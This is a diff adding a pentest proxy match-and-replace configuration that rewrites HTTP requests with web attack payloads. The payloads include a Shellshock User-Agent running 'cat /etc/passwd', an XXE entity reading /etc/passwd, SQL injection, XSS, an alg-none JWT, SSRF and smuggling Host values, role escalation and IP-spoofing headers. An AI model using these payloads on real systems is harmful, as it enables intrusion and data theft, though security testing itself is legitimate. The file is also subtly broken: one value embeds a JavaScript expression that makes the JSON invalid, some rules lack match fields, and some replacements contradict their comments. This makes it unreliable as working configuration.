@@ -1,0 +1,286 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Spoof Authorization header for API testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization: Bearer FAKE_ACCESS_TOKEN"
+            },
+            {
+                "comment": "Spoof JWT with vulnerable algorithm",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Authorization: Bearer .*\\..*\\..*$",
+                "string_replace": "Authorization: Bearer eyJhbGciOiJub25lIn0.e30."
+            },
+            {
+                "comment": "Inject CORS Origin header for bypass testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Origin:.*$",
+                "string_replace": "Origin: https://evil.example.com"
+            },
+            {
+                "comment": "Set a large Content-Length header for testing buffer overflows",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Content-Length:.*$",
+                "string_replace": "Content-Length: 99999999"
+            },
+            {
+                "comment": "Inject Host header for server-side request forgery (SSRF) testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Host:.*$",
+                "string_replace": "Host: internal-service.local"
+            },
+            {
+                "comment": "Set Content-Type to invalid MIME type",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Content-Type:.*$",
+                "string_replace": "Content-Type: application/x-invalid-type"
+            },
+            {
+                "comment": "Inject custom HTTP method override header",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^X-HTTP-Method-Override:.*$",
+                "string_replace": "X-HTTP-Method-Override: DELETE"
+            },
+            {
+                "comment": "Spoof Referer header for unauthorized access testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*$",
+                "string_replace": "Referer: https://admin.example.com"
+            },
+            {
+                "comment": "Add API key to Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "Authorization: ApiKey FAKE_API_KEY"
+            },
+            {
+                "comment": "Inject custom X-Client-IP header for IP spoofing",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "X-Client-IP: 127.0.0.1"
+            },
+            {
+                "comment": "Inject custom X-Original-URL header for path override testing",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "X-Original-URL: /admin"
+            },
+            {
+                "comment": "Inject X-Real-IP header for IP-based ACL bypass",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "X-Real-IP: 127.0.0.1"
+            },
+            {
+                "comment": "Set malformed User-Agent header for fuzzing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^User-Agent:.*$",
+                "string_replace": "User-Agent: ) { :; }; /bin/bash -c 'cat /etc/passwd'"
+            },
+            {
+                "comment": "Inject X-Custom header for hidden functionality testing",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "X-Custom-Header: special-feature-enabled"
+            },
+            {
+                "comment": "Add spoofed X-Forwarded-For header for IP spoofing",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "X-Forwarded-For: 192.168.1.1"
+            },
+            {
+                "comment": "Replace Accept header with wildcard for API negotiation testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Accept:.*$",
+                "string_replace": "Accept: */*"
+            },
+            {
+                "comment": "Set Range header to test for range-based vulnerabilities",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "Range: bytes=0-18446744073709551615"
+            },
+            {
+                "comment": "Inject Host header for HTTP smuggling testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_header",
+                "string_match": "^Host:.*$",
+                "string_replace": "Host: vulnerable-backend.com\r\nX-Injected: true"
+            },
+            {
+                "comment": "Inject SQL Injection payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "sqli_payload",
+                "string_replace": "' OR '1'='1"
+            },
+            {
+                "comment": "Inject Cross-Site Scripting (XSS) payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "xss_payload",
+                "string_replace": "\"><svg/onload=alert(1)>"
+            },
+            {
+                "comment": "Inject NoSQL Injection payload",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"\\$ne\":|\"\\$gt\":|\"\\$lt\":|\"\\$where\":)",
+                "string_replace": "\"safe_field\":"
+            },
+            {
+                "comment": "Replace sensitive data (credit card numbers) with fake data",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"credit_card\":\\s*\"[0-9]{16}\")",
+                "string_replace": "\"credit_card\": \"4111111111111111\""
+            },
+            {
+                "comment": "Replace sensitive data (SSNs) with fake data",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"ssn\":\\s*\"[0-9]{3}-[0-9]{2}-[0-9]{4}\")",
+                "string_replace": "\"ssn\": \"123-45-6789\""
+            },
+            {
+                "comment": "Inject privilege escalation payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"role\": \"user\"",
+                "string_replace": "\"role\": \"admin\""
+            },
+            {
+                "comment": "Bypass business logic validation with large numeric value",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"amount\": \\d+",
+                "string_replace": "\"amount\": 999999999"
+            },
+            {
+                "comment": "Replace boolean value for logic testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"enabled\":\\s*false)",
+                "string_replace": "\"enabled\": true"
+            },
+            {
+                "comment": "Inject XML External Entity (XXE) payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "<!ENTITY xxe",
+                "string_replace": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+            },
+            {
+                "comment": "Replace large JSON array for fuzz testing",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"items\": []",
+                "string_replace": "\"items\": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"
+            },
+            {
+                "comment": "Inject API key bypass payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"api_key\": \"valid_key\"",
+                "string_replace": "\"api_key\": \"invalid_key\""
+            },
+            {
+                "comment": "Add unexpected parameter to test input handling",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "}",
+                "string_replace": ", \"unexpected_param\": \"value\"}"
+            },
+            {
+                "comment": "Replace file upload path with malicious file",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"file_path\":\\s*\"[^\"]*\\.(txt|jpg)\")",
+                "string_replace": "\"file_path\": \"malicious.php\""
+            },
+            {
+                "comment": "Inject insecure deserialization payload",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\\bObjectInputStream\\b|\\bpickle\\b|\\bYAML\\.load\\b)",
+                "string_replace": "SAFE_PAYLOAD"
+            },
+            {
+                "comment": "Replace email for testing",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"email\":\\s*\"[^\"]*\")",
+                "string_replace": "\"email\": \"test@example.com\""
+            },
+            {
+                "comment": "Fuzz long strings in text fields",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "(\"text_field\":\\s*\"[^\"]*\")",
+                "string_replace": "\"text_field\": \"" + "A".repeat(5000) + "\""
+            },
+            {
+                "comment": "Inject request smuggling payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "smuggle_test",
+                "string_replace": "0\r\n\r\nSMUGGLED_DATA"
+            },
+            {
+                "comment": "Test API key bypass with empty Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_replace": "Authorization: "
+            }
+        ]
+    }
+}
